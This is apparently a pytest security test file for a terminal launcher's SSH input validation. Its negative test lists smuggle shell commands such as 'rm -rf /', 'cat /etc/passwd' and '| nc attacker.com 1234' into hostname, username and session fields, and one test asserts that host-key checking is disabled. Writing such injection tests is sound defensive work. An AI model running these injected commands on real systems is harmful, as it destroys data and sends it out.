"""Security tests for terminal launcher.

Tests for SEC-001: Command Injection Prevention
Verifies that all subprocess calls use argument lists and input validation.
"""

import subprocess
import tempfile
from pathlib import Path
from unittest.mock import MagicMock, patch

import pytest

from azlin.terminal_launcher import (
    SecurityValidationError,
    TerminalConfig,
    TerminalLauncher,
)


@pytest.fixture
def temp_ssh_key():
    """Create temporary SSH key file for testing."""
    with tempfile.NamedTemporaryFile(mode="w", delete=False, suffix=".pem") as f:
        f.write("fake ssh key content")
        key_path = Path(f.name)

    yield key_path

    # Cleanup
    key_path.unlink(missing_ok=True)


class TestInputValidation:
    """Test input validation for all user-controlled parameters."""

    def test_valid_hostname(self, temp_ssh_key):
        """Test that valid hostnames are accepted."""
        valid_hostnames = [
            "example.com",
            "sub.example.com",
            "192.168.1.1",
            "server-01",
            "server_01",
            "2001:db8::1",
            "[2001:db8::1]",
        ]

        for hostname in valid_hostnames:
            config = TerminalConfig(
                ssh_host=hostname,
                ssh_user="testuser",
                ssh_key_path=temp_ssh_key,
            )
            assert config.ssh_host == hostname

    def test_invalid_hostname_command_injection(self, temp_ssh_key):
        """Test that hostnames with command injection attempts are rejected."""
        malicious_hostnames = [
            "example.com; rm -rf /",
            "example.com && cat /etc/passwd",
            "example.com | nc attacker.com 1234",
            "example.com`whoami`",
            "example.com$(whoami)",
            "example.com\nrm -rf /",
            "example.com\rrm -rf /",
            "example.com > /tmp/evil",
            "example.com < /etc/passwd",
            "example.com & backdoor",
        ]

        for hostname in malicious_hostnames:
            with pytest.raises(SecurityValidationError) as exc_info:
                TerminalConfig(
                    ssh_host=hostname,
                    ssh_user="testuser",
                    ssh_key_path=temp_ssh_key,
                )
            assert "dangerous character" in str(exc_info.value).lower() or \
                   "disallowed characters" in str(exc_info.value).lower()

    def test_invalid_hostname_empty(self, temp_ssh_key):
        """Test that empty hostnames are rejected."""
        with pytest.raises(SecurityValidationError) as exc_info:
            TerminalConfig(
                ssh_host="",
                ssh_user="testuser",
                ssh_key_path=temp_ssh_key,
            )
        assert "cannot be empty" in str(exc_info.value).lower()

    def test_valid_username(self, temp_ssh_key):
        """Test that valid usernames are accepted."""
        valid_usernames = [
            "user",
            "user123",
            "user-name",
            "user_name",
            "user.name",
        ]

        for username in valid_usernames:
            config = TerminalConfig(
                ssh_host="example.com",
                ssh_user=username,
                ssh_key_path=temp_ssh_key,
            )
            assert config.ssh_user == username

    def test_invalid_username_command_injection(self, temp_ssh_key):
        """Test that usernames with command injection attempts are rejected."""
        malicious_usernames = [
            "user; rm -rf /",
            "user && whoami",
            "user | nc attacker.com",
            "user`whoami`",
            "user$(whoami)",
            "user@attacker.com",
            "user\nmalicious",
        ]

        for username in malicious_usernames:
            with pytest.raises(SecurityValidationError) as exc_info:
                TerminalConfig(
                    ssh_host="example.com",
                    ssh_user=username,
                    ssh_key_path=temp_ssh_key,
                )
            assert "disallowed characters" in str(exc_info.value).lower()

    def test_invalid_username_empty(self, temp_ssh_key):
        """Test that empty usernames are rejected."""
        with pytest.raises(SecurityValidationError) as exc_info:
            TerminalConfig(
                ssh_host="example.com",
                ssh_user="",
                ssh_key_path=temp_ssh_key,
            )
        assert "cannot be empty" in str(exc_info.value).lower()

    def test_valid_command(self, temp_ssh_key):
        """Test that valid commands are accepted."""
        valid_commands = [
            "ls -la",
            "cd /tmp && ls",
            "echo 'Hello World'",
            "python3 script.py --arg value",
        ]

        for command in valid_commands:
            config = TerminalConfig(
                ssh_host="example.com",
                ssh_user="testuser",
                ssh_key_path=temp_ssh_key,
                command=command,
            )
            assert config.command == command

    def test_invalid_command_null_bytes(self, temp_ssh_key):
        """Test that commands with null bytes are rejected."""
        with pytest.raises(SecurityValidationError) as exc_info:
            TerminalConfig(
                ssh_host="example.com",
                ssh_user="testuser",
                ssh_key_path=temp_ssh_key,
                command="ls\x00rm -rf /",
            )
        assert "null bytes" in str(exc_info.value).lower()

    def test_invalid_command_empty(self, temp_ssh_key):
        """Test that empty commands are rejected."""
        with pytest.raises(SecurityValidationError) as exc_info:
            TerminalConfig(
                ssh_host="example.com",
                ssh_user="testuser",
                ssh_key_path=temp_ssh_key,
                command="   ",
            )
        assert "cannot be empty" in str(exc_info.value).lower()

    def test_valid_tmux_session(self, temp_ssh_key):
        """Test that valid tmux session names are accepted."""
        valid_sessions = [
            "session1",
            "my-session",
            "my_session",
            "session.1",
        ]

        for session in valid_sessions:
            config = TerminalConfig(
                ssh_host="example.com",
                ssh_user="testuser",
                ssh_key_path=temp_ssh_key,
                tmux_session=session,
            )
            assert config.tmux_session == session

    def test_invalid_tmux_session_command_injection(self, temp_ssh_key):
        """Test that tmux session names with command injection are rejected."""
        malicious_sessions = [
            "session; rm -rf /",
            "session && whoami",
            "session | nc attacker.com",
            "session`whoami`",
            "session$(whoami)",
        ]

        for session in malicious_sessions:
            with pytest.raises(SecurityValidationError) as exc_info:
                TerminalConfig(
                    ssh_host="example.com",
                    ssh_user="testuser",
                    ssh_key_path=temp_ssh_key,
                    tmux_session=session,
                )
            assert "disallowed characters" in str(exc_info.value).lower()

    def test_ssh_key_path_validation(self):
        """Test that non-existent SSH key paths are rejected."""
        with pytest.raises(SecurityValidationError) as exc_info:
            TerminalConfig(
                ssh_host="example.com",
                ssh_user="testuser",
                ssh_key_path=Path("/nonexistent/key.pem"),
            )
        assert "not found" in str(exc_info.value).lower()


class TestSubprocessSafety:
    """Test that all subprocess calls use safe argument lists."""

    @patch("subprocess.run")
    def test_fallback_inline_ssh_no_shell(self, mock_run, temp_ssh_key):
        """Test that _fallback_inline_ssh uses argument list, not shell."""
        mock_run.return_value = MagicMock(returncode=0)

        config = TerminalConfig(
            ssh_host="example.com",
            ssh_user="testuser",
            ssh_key_path=temp_ssh_key,
        )

        TerminalLauncher._fallback_inline_ssh(config)

        # Verify subprocess.run was called
        assert mock_run.called
        call_args = mock_run.call_args

        # First argument should be a list
        assert isinstance(call_args[0][0], list)

        # Verify 'shell' is not True
        if "shell" in call_args[1]:
            assert call_args[1]["shell"] is False

    @patch("subprocess.run")
    def test_build_ssh_command_returns_list(self, mock_run, temp_ssh_key):
        """Test that _build_ssh_command returns a list of arguments."""
        config = TerminalConfig(
            ssh_host="example.com",
            ssh_user="testuser",
            ssh_key_path=temp_ssh_key,
            command="ls -la",
        )

        cmd = TerminalLauncher._build_ssh_command(config)

        # Verify return type is list
        assert isinstance(cmd, list)

        # Verify first element is 'ssh'
        assert cmd[0] == "ssh"

        # Verify list contains expected elements
        assert "-i" in cmd
        assert str(temp_ssh_key) in cmd
        assert "testuser@example.com" in cmd

    @patch("subprocess.run")
    def test_fallback_inline_ssh_injection_attempt(self, mock_run, temp_ssh_key):
        """Test that injection attempts in fallback SSH are prevented."""
        mock_run.return_value = MagicMock(returncode=0)

        # This should fail at validation, before subprocess.run is called
        with pytest.raises(SecurityValidationError):
            config = TerminalConfig(
                ssh_host="example.com; rm -rf /",
                ssh_user="testuser",
                ssh_key_path=temp_ssh_key,
            )
            TerminalLauncher._fallback_inline_ssh(config)

        # Verify subprocess.run was NOT called
        assert not mock_run.called

    @patch("subprocess.Popen")
    def test_launch_linux_gnome_terminal_uses_argument_list(
        self, mock_popen, temp_ssh_key
    ):
        """Test that Linux gnome-terminal launch uses argument list."""
        with patch.object(
            TerminalLauncher, "_has_command", return_value=True
        ):
            config = TerminalConfig(
                ssh_host="example.com",
                ssh_user="testuser",
                ssh_key_path=temp_ssh_key,
            )

            TerminalLauncher._launch_linux(config)

            # Verify Popen was called
            assert mock_popen.called
            call_args = mock_popen.call_args

            # First argument should be a list
            assert isinstance(call_args[0][0], list)

            # Verify first element is gnome-terminal
            assert call_args[0][0][0] == "gnome-terminal"

    @patch("subprocess.run")
    def test_launch_macos_uses_argument_list(self, mock_run, temp_ssh_key):
        """Test that macOS terminal launch uses argument list."""
        mock_run.return_value = MagicMock(returncode=0, stderr="")

        config = TerminalConfig(
            ssh_host="example.com",
            ssh_user="testuser",
            ssh_key_path=temp_ssh_key,
        )

        TerminalLauncher._launch_macos(config)

        # Verify subprocess.run was called
        assert mock_run.called
        call_args = mock_run.call_args

        # First argument should be a list
        assert isinstance(call_args[0][0], list)

        # Verify first element is osascript
        assert call_args[0][0][0] == "osascript"

        # Verify 'shell' is not True
        if "shell" in call_args[1]:
            assert call_args[1]["shell"] is False


class TestCommandBuildingSecurity:
    """Test secure command building."""

    def test_ssh_command_structure(self, temp_ssh_key):
        """Test that SSH command has proper structure."""
        config = TerminalConfig(
            ssh_host="example.com",
            ssh_user="testuser",
            ssh_key_path=temp_ssh_key,
        )

        cmd = TerminalLauncher._build_ssh_command(config)

        # Verify it's a list
        assert isinstance(cmd, list)

        # Verify SSH options are separate arguments
        assert "ssh" in cmd
        assert "-o" in cmd
        assert "StrictHostKeyChecking=no" in cmd
        assert "-i" in cmd

    def test_ssh_command_with_remote_command(self, temp_ssh_key):
        """Test SSH command building with remote command."""
        config = TerminalConfig(
            ssh_host="example.com",
            ssh_user="testuser",
            ssh_key_path=temp_ssh_key,
            command="ls -la /tmp",
        )

        cmd = TerminalLauncher._build_ssh_command(config)

        # Verify command is included
        assert any("ls -la /tmp" in arg for arg in cmd)

    def test_ssh_command_with_tmux_session(self, temp_ssh_key):
        """Test SSH command building with tmux session."""
        config = TerminalConfig(
            ssh_host="example.com",
            ssh_user="testuser",
            ssh_key_path=temp_ssh_key,
            tmux_session="mysession",
        )

        cmd = TerminalLauncher._build_ssh_command(config)

        # Verify tmux command is included
        assert any("tmux" in arg and "mysession" in arg for arg in cmd)

    def test_ssh_command_with_both_command_and_tmux(self, temp_ssh_key):
        """Test SSH command building with both command and tmux."""
        config = TerminalConfig(
            ssh_host="example.com",
            ssh_user="testuser",
            ssh_key_path=temp_ssh_key,
            command="ls -la",
            tmux_session="mysession",
        )

        cmd = TerminalLauncher._build_ssh_command(config)

        # Verify both are included
        assert any("tmux" in arg and "mysession" in arg and "ls -la" in arg for arg in cmd)


class TestNoOsSystemUsage:
    """Verify that os.system is not used anywhere."""

    def test_no_os_system_in_fallback(self, temp_ssh_key):
        """Test that fallback SSH does not use os.system."""
        with patch("subprocess.run") as mock_run:
            mock_run.return_value = MagicMock(returncode=0)

            config = TerminalConfig(
                ssh_host="example.com",
                ssh_user="testuser",
                ssh_key_path=temp_ssh_key,
            )

            # This should use subprocess.run, not os.system
            result = TerminalLauncher._fallback_inline_ssh(config)

            # Verify subprocess.run was called
            assert mock_run.called
            assert result is True


class TestEdgeCases:
    """Test edge cases and boundary conditions."""

    def test_hostname_with_port(self, temp_ssh_key):
        """Test hostname with port number."""
        # Port numbers should be handled by SSH, not in hostname validation
        config = TerminalConfig(
            ssh_host="example.com",
            ssh_user="testuser",
            ssh_key_path=temp_ssh_key,
        )
        assert config.ssh_host == "example.com"

    def test_ipv6_hostname(self, temp_ssh_key):
        """Test IPv6 address as hostname."""
        config = TerminalConfig(
            ssh_host="2001:db8::1",
            ssh_user="testuser",
            ssh_key_path=temp_ssh_key,
        )
        assert config.ssh_host == "2001:db8::1"

    def test_unicode_in_command(self, temp_ssh_key):
        """Test command with unicode characters."""
        config = TerminalConfig(
            ssh_host="example.com",
            ssh_user="testuser",
            ssh_key_path=temp_ssh_key,
            command="echo 'Hello 世界'",
        )
        assert config.command == "echo 'Hello 世界'"

    def test_very_long_hostname(self, temp_ssh_key):
        """Test handling of very long hostname."""
        long_hostname = "a" * 255 + ".com"
        config = TerminalConfig(
            ssh_host=long_hostname,
            ssh_user="testuser",
            ssh_key_path=temp_ssh_key,
        )
        assert config.ssh_host == long_hostname


class TestErrorHandling:
    """Test error handling in various scenarios."""

    @patch("subprocess.run")
    def test_fallback_ssh_handles_exceptions(self, mock_run, temp_ssh_key):
        """Test that fallback SSH handles subprocess exceptions."""
        mock_run.side_effect = Exception("Connection failed")

        config = TerminalConfig(
            ssh_host="example.com",
            ssh_user="testuser",
            ssh_key_path=temp_ssh_key,
        )

        # Should not raise, should return False
        result = TerminalLauncher._fallback_inline_ssh(config)
        assert result is False

    @patch("subprocess.run")
    def test_fallback_ssh_handles_nonzero_exit(self, mock_run, temp_ssh_key):
        """Test that fallback SSH handles non-zero exit codes."""
        mock_run.return_value = MagicMock(returncode=1)

        config = TerminalConfig(
            ssh_host="example.com",
            ssh_user="testuser",
            ssh_key_path=temp_ssh_key,
        )

        result = TerminalLauncher._fallback_inline_ssh(config)
        assert result is False
